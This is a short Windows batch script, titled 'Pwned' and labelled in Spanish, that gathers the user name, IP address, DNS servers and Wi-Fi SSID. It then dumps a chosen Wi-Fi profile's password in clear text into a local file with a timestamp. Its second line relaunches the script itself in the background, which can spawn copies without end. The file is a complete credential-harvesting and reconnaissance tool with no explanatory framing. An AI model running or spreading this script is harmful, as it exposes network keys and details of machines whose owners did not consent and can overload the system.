@echo off
    start /B "" "%~dpnx0" > flag_Perm.txt
    cls & color 7 & title Pwned &
    echo ------Usuario------
    whoami 

    echo ------Direccion IPv4------
    for /F "tokens=2 delims=:" %%i in ('ipconfig ^| findstr "IPv4"') do echo %%i
    
    echo ------Servidores------
    ipconfig /allcompartments /all | findstr  "Servidor"

    echo ------Interfaz Wi-Fi------
    netsh wlan show interfaces | findstr "SSID"

    set /p "ty=Escribe-> "

    echo ------Clave De SSID------
    netsh wlan show profile name=%ty% key=clear | findstr "clave" >> flag_Perm1.txt
    time /T >> flag_Perm1.txt
    date /T >> flag_Perm1.txt
    echo ------:D------- >> flag_Perm1.txt
rem timeout /t 2 > nul
